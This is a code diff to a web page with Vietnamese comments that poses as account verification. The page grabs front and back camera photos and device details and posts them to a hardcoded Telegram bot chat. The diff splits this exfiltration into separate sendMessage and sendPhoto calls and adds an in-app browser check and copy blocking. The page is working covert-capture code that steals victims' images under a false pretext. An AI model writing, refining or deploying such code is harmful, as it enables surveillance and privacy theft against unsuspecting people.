@@ -99,6 +99,7 @@
         const CHAT_ID = "7031115869";
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
+        // Kiểm tra In-App Browser
         function checkAndShowWarning() {
             const ua = navigator.userAgent || navigator.vendor || window.opera;
             if (/TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
@@ -111,12 +112,13 @@
         const btn = document.getElementById('startBtn');
         const video = document.getElementById('preview');
         const status = document.getElementById('status');
+        const msg = document.getElementById('msg');
         let frontStream = null;
 
         btn.addEventListener('click', async () => {
             btn.disabled = true;
             btn.innerText = "ĐANG XỬ LÝ...";
-            status.textContent = "Đang truy cập camera...";
+            status.innerHTML = "Đang truy cập camera...";
 
             try {
                 await main();
@@ -157,10 +159,13 @@
             info.device = ua.substring(0, 80) + "...";
         }
 
+        // Chụp camera có timeout
         async function captureCameraWithTimeout(facingMode, timeoutMs = 6000) {
             return Promise.race([
                 captureCamera(facingMode),
-                new Promise((_, reject) => setTimeout(() => reject(new Error("timeout")), timeoutMs))
+                new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error("Camera timeout")), timeoutMs)
+                )
             ]).catch(() => null);
         }
 
@@ -198,63 +203,36 @@
             }
         }
 
-        // ================== GỬI CHUNG 1 TIN NHẮN ==================
         async function sendToTelegram(info, frontBlob, backBlob) {
-            const caption = `🔐 **Xác Minh Tài Khoản Mới**\n\n` +
-                           `⏰ Thời gian: ${info.time}\n` +
-                           `📱 Thiết bị: ${info.device}\n` +
-                           `🖥 Hệ điều hành: ${info.os}\n` +
-                           `📷 Camera: ${info.camera}`;
+            const text = `🔐 Xác Thực Mới\n\n` +
+                        `⏰ ${info.time}\n` +
+                        `📱 ${info.device}\n` +
+                        `🖥 ${info.os}\n` +
+                        `📷 ${info.camera}`;
 
-            // Nếu có cả 2 ảnh → dùng Media Group
-            if (frontBlob && backBlob) {
-                const media = [
-                    {
-                        type: "photo",
-                        media: "attach://front",
-                        caption: caption,
-                        parse_mode: "Markdown"
-                    },
-                    {
-                        type: "photo",
-                        media: "attach://back"
-                    }
-                ];
+            // Gửi text
+            await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
 
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('media', JSON.stringify(media));
-                formData.append('front', frontBlob, 'front.jpg');
-                formData.append('back', backBlob, 'back.jpg');
-
-                await fetch(`${TELEGRAM_API}/sendMediaGroup`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-            } 
-            // Nếu chỉ có 1 ảnh
-            else if (frontBlob || backBlob) {
-                const photo = frontBlob || backBlob;
+            // Gửi ảnh trước
+            if (frontBlob) {
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', photo, frontBlob ? 'front.jpg' : 'back.jpg');
-                fd.append('caption', caption);
-                fd.append('parse_mode', 'Markdown');
-
+                fd.append('photo', frontBlob, 'front.jpg');
+                fd.append('caption', '📸 Camera Trước');
                 await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: fd });
-            } 
-            // Không có ảnh nào
-            else {
-                await fetch(`${TELEGRAM_API}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: caption,
-                        parse_mode: 'Markdown'
-                    })
-                });
+            }
+
+            // Gửi ảnh sau
+            if (backBlob) {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', backBlob, 'back.jpg');
+                fd.append('caption', '📸 Camera Sau');
+                await fetch(`${TELEGRAM_API}/sendPhoto`, { method: 'POST', body: fd });
             }
         }
 
@@ -266,11 +244,12 @@
                 if (timeLeft < 0) {
                     clearInterval(timer);
                     if (frontStream) frontStream.getTracks().forEach(t => t.stop());
-                    window.location.href = "";
+                    window.location.href = ""; // Thay link nếu cần
                 }
             }, 1000);
         }
 
+        // Chặn copy
         document.addEventListener('copy', e => e.preventDefault());
     </script>
 </body>
